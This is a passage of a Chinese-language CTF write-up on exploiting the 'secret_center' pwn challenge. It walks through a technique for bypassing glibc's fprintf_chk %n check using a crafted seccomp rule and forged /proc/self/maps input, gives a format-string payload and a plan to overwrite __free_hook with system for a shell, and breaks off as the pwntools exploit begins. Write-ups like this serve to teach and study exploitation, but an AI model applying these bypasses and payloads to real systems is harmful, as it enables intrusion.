class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">set_guard</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = guard_num;</span><br><span class="line">  v2 = bss_guard;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  result = prctl(<span class="number">0x16</span>, <span class="number">2L</span>L, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"what?"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>程序存在两个显式漏洞堆漏洞和格式化字符串。但是fprintf_chk函数不能使用%n写入数据，由于输出是stderr的情况也不能泄露数据。并且由于程序开启了全部的保护规则，因此仅通过堆漏洞，无法获得地址利用，但是将二者结合使用，会出现很有意思的情况。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; checksec secret_center </span><br><span class="line">[*] <span class="string">'/home/p4nda/Desktop/pwn/other/xnuca/secretcenter/secret_center'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><h2 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h2><p>seccomp是在内核中实现的对于用户系统调用及其参数的过滤，决定是否继续调用此系统调用，相当于自废武功，在CTF通防中很容易遇到，一般会禁用execve这样的系统调用，防止拿到shell。</p><p>在内核处理请求系统调用时在此处（\arch\x86\entry\enrty_64.S  line 247）进入检查，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Do syscall entry tracing */</span></span><br><span class="line">tracesys:</span><br><span class="line">movq%rsp, %rdi</span><br><span class="line">movl$AUDIT_ARCH_X86_64, %esi</span><br><span class="line">callsyscall_trace_enter_phase1</span><br><span class="line">test%rax, %rax</span><br><span class="line">jnztracesys_phase2<span class="comment">/* if needed, run the slow path */</span></span><br><span class="line">RESTORE_C_REGS_EXCEPT_RAX<span class="comment">/* else restore clobbered regs */</span></span><br><span class="line">movqORIG_RAX(%rsp), %rax</span><br><span class="line">jmpentry_SYSCALL_64_fastpath<span class="comment">/* and return to the fast path */</span></span><br><span class="line"></span><br><span class="line">tracesys_phase2:</span><br><span class="line">SAVE_EXTRA_REGS</span><br><span class="line">movq%rsp, %rdi</span><br><span class="line">movl$AUDIT_ARCH_X86_64, %esi</span><br><span class="line">movq%rax, %rdx</span><br><span class="line">callsyscall_trace_enter_phase2</span><br></pre></td></tr></table></figure><p>具体的检查机制在\arch\x86\net\bpf_jit_comp.c中。</p><p>好在david942j@217已经写出一套可以方便分析seccomp功能及编写seccomp的工具<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a></p><p>如分析程序预置的seccomp规则.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; seccomp-tools dump ./secret_center </span><br><span class="line">Welcome to Secret Center!</span><br><span class="line">[*]Reinforcable Secret Service..</span><br><span class="line">[1] show secret on Server</span><br><span class="line">[2] input my secret</span><br><span class="line">[3] delete my secret</span><br><span class="line">[4] Guard Ready</span><br><span class="line">[5] Set Guard</span><br><span class="line">[6] edit my secret</span><br><span class="line">[7] <span class="built_in">exit</span></span><br><span class="line">&gt;</span><br><span class="line">4</span><br><span class="line">[1] show secret on Server</span><br><span class="line">[2] input my secret</span><br><span class="line">[3] delete my secret</span><br><span class="line">[4] Guard Ready</span><br><span class="line">[5] Set Guard</span><br><span class="line">[6] edit my secret</span><br><span class="line">[7] <span class="built_in">exit</span></span><br><span class="line">&gt;</span><br><span class="line">5</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  <span class="keyword">if</span> (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x000000e7  <span class="keyword">if</span> (A != exit_group) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000000  <span class="keyword">if</span> (A != <span class="built_in">read</span>) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x00000002  <span class="keyword">if</span> (A != open) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000001  <span class="keyword">if</span> (A != write) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000003  <span class="keyword">if</span> (A != close) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><h2 id="fprintf-chk"><a href="#fprintf-chk" class="headerlink" title="fprintf_chk"></a>fprintf_chk</h2><p>这个函数在潜意识里觉得这个函数的格式化字符串漏洞是没有办法利用的。如执行%n</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; ./secret_center </span><br><span class="line">Welcome to Secret Center!</span><br><span class="line">[*]Reinforcable Secret Service..</span><br><span class="line">[1] show secret on Server</span><br><span class="line">[2] input my secret</span><br><span class="line">[3] delete my secret</span><br><span class="line">[4] Guard Ready</span><br><span class="line">[5] Set Guard</span><br><span class="line">[6] edit my secret</span><br><span class="line">[7] <span class="built_in">exit</span></span><br><span class="line">&gt;</span><br><span class="line">2</span><br><span class="line">Secret Size: </span><br><span class="line">123</span><br><span class="line">Content: </span><br><span class="line">%n</span><br><span class="line">Not Good Secret :P</span><br><span class="line"></span><br><span class="line">*** %n <span class="keyword">in</span> writable segment detected ***</span><br><span class="line">[1]    42169 abort (core dumped)  ./secret_center</span><br></pre></td></tr></table></figure><p>可以看到%n被检测出来，可以看一下检测的逻辑在glibc-2.23\stdio-common\vfprintf.c  line 892</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (! readonly_format)      \</span><br><span class="line">    &#123;      \</span><br><span class="line">      <span class="keyword">extern</span> <span class="keyword">int</span> __readonly_area (<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>)      \</span><br><span class="line">attribute_hidden;      \</span><br><span class="line">      readonly_format      \</span><br><span class="line">= __readonly_area (format, ((STR_LEN (format) + <span class="number">1</span>)      \</span><br><span class="line">    * <span class="keyword">sizeof</span> (CHAR_T)));      \</span><br><span class="line">    &#125;      \</span><br><span class="line">  <span class="keyword">if</span> (readonly_format &lt; <span class="number">0</span>)      \</span><br><span class="line">    __libc_fatal (<span class="string">"*** %n in writable segment detected ***\n"</span>);      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到readonly<em>format是一个全局变量，当format不通过\</em>_readonly_area检测时，会返回一个负数，从而导致程序结束。</p><p>再看一下__readonly_area(\glibc-2.23\sysdeps\unix\sysv\linux\readonly-area.c)，通过fopen打开”/proc/self/maps”，来判断ptr是否是只读段，这样我们好像只要让fprintf_chk认为format是只读段就可以了。</p><p>由于我们没有其他权限，不能修改”/proc/self/maps”，可以看能否从fopen中做文章。</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>提到fopen就不得不提到一个结构体__IO_FILE，这个结构体在IO利用方法里经常遇到，与通常open打开的文件不同的是，其为每个文件定义了缓冲区和虚表函数，而利用_fileno来判定是哪个文件，如stdin._fileno=0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而fopen中真正打开并填写fileno字段的函数在\libio\fileops.c中，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_file_open (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> posix_mode, <span class="keyword">int</span> prot,</span><br><span class="line">       <span class="keyword">int</span> read_write, <span class="keyword">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">    fdesc = open_not_cancel (filename,</span><br><span class="line">     posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们可以控制seccomp从而控制系统调用的访问，我们可以将此次打开返回ERROR ，而此时，open的返回值为0，此时fopen并不认为文件打开失败，而是认为其fileno是0，此时程序会从STDIN中读取数据，进行判断。</p><p>既然可以控制程序读入的内容，我们可以输入一个伪造的maps数据，使其认为内存是不可写的，这样就可以绕过判断，构造如下数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/p4nda</span><br></pre></td></tr></table></figure><p>这样我们可以绕过fprintf_chk判断，利用%n来写数据了。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="沙箱构造"><a href="#沙箱构造" class="headerlink" title="沙箱构造"></a>沙箱构造</h3><p>我们可以构造这样一个沙箱规则，当遇到系统调用时open时，判断其参数的最后一个字节是否是libc中“/proc/self/maps”的地址，如果是就返回ERROR，否则继续。</p><p>后续还有一个坑点，当fopen检查完后，会fclose关闭上述文件，此时用户stdin会被关闭，造成无法后续输入，这样简单，只需把close调用也关闭即可。</p><p>最终沙箱规则如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : dead</span><br><span class="line">A = sys_number</span><br><span class="line">A == close ? dead : next</span><br><span class="line">A == exit_group ? dead : next</span><br><span class="line">A == open ? next : allow</span><br><span class="line">A = args[0]</span><br><span class="line">A &amp;= 0xff</span><br><span class="line">A == 0x7c ? dead : next</span><br><span class="line">allow:</span><br><span class="line"><span class="built_in">return</span> ALLOW</span><br><span class="line">dead:</span><br><span class="line"><span class="built_in">return</span> ERRNO(0)</span><br></pre></td></tr></table></figure><p>利用seccomp-tools生成这样的规则：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; seccomp-tools <span class="keyword">asm</span> rule.<span class="keyword">asm</span> -a amd64 -f raw | seccomp-tools disasm -</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A != open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = args[<span class="number">0</span>]</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x54</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x000000ff</span>  A &amp;= <span class="number">0xff</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000007c</span>  <span class="keyword">if</span> (A == <span class="number">124</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00050000</span>  <span class="keyword">return</span> ERRNO(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>已经知道了如何绕过%n的检测了，由于没有已知的地址，向哪里写数据又是一个问题，先看一下栈上有哪些数据吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint __fprintf_chk</span><br><span class="line">pwndbg&gt; x /40gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffd328:0x0000555555554f4d0x0000000000000000</span><br><span class="line">0x7fffffffd338:0x0000007b000000000x00000000ff0a7025</span><br><span class="line">0x7fffffffd348:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffd358:0x00000000000000000xff000000ff000000</span><br><span class="line">0x7fffffffd368:0x0000ff00000000000x0000000000000000</span><br><span class="line">0x7fffffffd378:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffd388:0x00007ffff7b09ef90x00007ffff7dd1b20</span><br><span class="line">0x7fffffffd398:0x00000000000000800x0000000000000000</span><br><span class="line">0x7fffffffd3a8:0x00007ffff7a948c90x0000000000000000</span><br><span class="line">0x7fffffffd3b8:0x00007ffff7a8e86b0x0000000000000000</span><br><span class="line">0x7fffffffd3c8:0x00000000000000a00x0000000000000fff</span><br><span class="line">0x7fffffffd3d8:0xfffffffffffff0000x0000555555757000</span><br><span class="line">0x7fffffffd3e8:0x00000000000010000x00000000f7dd7390</span><br><span class="line">0x7fffffffd3f8:0x00000000000000000x00007fffffffd530</span><br><span class="line">0x7fffffffd408:0x00007ffff7ffea880x00007fffffffd560</span><br><span class="line">0x7fffffffd418:0x00007fffffffd5c00x00000000ffffffff</span><br><span class="line">0x7fffffffd428:0x00007ffff7dd1b200x0000000000000080</span><br><span class="line">0x7fffffffd438:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x7fffffffd448:0x00000000000027100x0000000000000000</span><br><span class="line">0x7fffffffd458:0x000000000000000a0x00007fffffffd57c</span><br><span class="line">pwndbg&gt; x /s 0x0000555555757010</span><br><span class="line">0x555555757010:<span class="string">"DwHxGpmDtDevggh"</span>...</span><br></pre></td></tr></table></figure><p>可以看到，在0x7fffffffd3e0这里，有一个离secret很近的地址，可以通过低字节修改使其指向secret，这样由于判定条件时，不相等的位置是否等于strlen(secret)，这样只要我们向secret写\0，就可以很容易绕过check了，构造格式化字符串如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fmt = (<span class="string">"%256p"</span>*<span class="number">0x19</span>+<span class="string">'%n'</span>).ljust(<span class="number">0xa0</span>,<span class="string">'a'</span>)</span><br><span class="line">input(<span class="number">0x120</span>,fmt+<span class="string">'\x10'</span>)<span class="comment">#7</span></span><br></pre></td></tr></table></figure><p>此时可以拿到vmmap内容，后续可以再次通过格式化字符串修改__free_hook为system就可以拿到shell，就是这样的格式化字符串构造有点烦…</p><p>堆漏洞也可以利用，不过由于有访问次数的限制，我总是差一次访问，就没有细究这种方法是否可行。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span 